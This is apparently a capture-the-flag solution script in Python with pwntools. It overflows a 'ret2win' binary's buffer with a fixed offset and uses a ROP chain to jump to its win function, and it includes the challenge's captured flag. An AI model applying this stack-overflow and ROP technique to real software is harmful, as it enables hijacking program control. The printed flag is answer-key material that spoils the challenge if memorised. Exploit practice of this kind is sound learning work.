from pwn import *
elf = context.binary = ELF("./ret2win", checksec=False)

p = process('./ret2win')
# p = remote("IP_ADDR", PORT)

offset = 0x78
RET_ADDR = 0x40101a
WIN_ADDR = elf.symbols.win

rop = ROP(elf)
rop.raw(RET_ADDR)
rop.raw(WIN_ADDR)

payload = b'A' * offset + rop.chain()
p.sendlineafter(b"Give me your payload: ", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# TCP1P{bisa_jalanin_fungsi_apapun_kan_jadinya_bang}

p.close()